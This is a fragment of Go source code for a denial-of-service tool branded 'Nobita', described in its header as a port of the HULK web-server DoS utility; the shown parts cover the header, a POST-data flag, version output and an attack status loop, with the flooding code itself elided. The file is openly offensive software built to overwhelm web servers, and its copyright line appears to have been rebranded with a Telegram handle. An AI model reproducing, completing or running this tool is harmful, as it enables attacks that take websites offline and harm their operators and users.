...
/*
 NOBITA DoS tool on <strike>steroids</strike> goroutines. Just ported from Python with some improvements.
 Original Python utility by Barry Shteiman http://www.sectorix.com/2012/05/17/hulk-web-server-dos-tool/

 This go program licensed under GPLv3.
 Copyright Alexander I.Grafov telegram <@Jr_arman_bhai>
*/
...
func main() {
	...
	flag.StringVar(&data, "data", "", "Data to POST. If present bobita will use POST requests instead of GET")
	...
	if version {
		fmt.Println("Nobita", __version__)
		os.Exit(0)
	}
	...
	go func() {
		fmt.Println("-- Nobita Attack Started --\n           Go!\n\n")
		...
		for {
			...
			case targetComplete:
				sent++
				fmt.Printf("\r%-6d of max %-6d |\t%7d |\t%6d", cur, maxproc, sent, err)
				fmt.Println("\r-- Nobita Attack Finished --       \n\n\r")
				os.Exit(0)
			}
		}
	}()
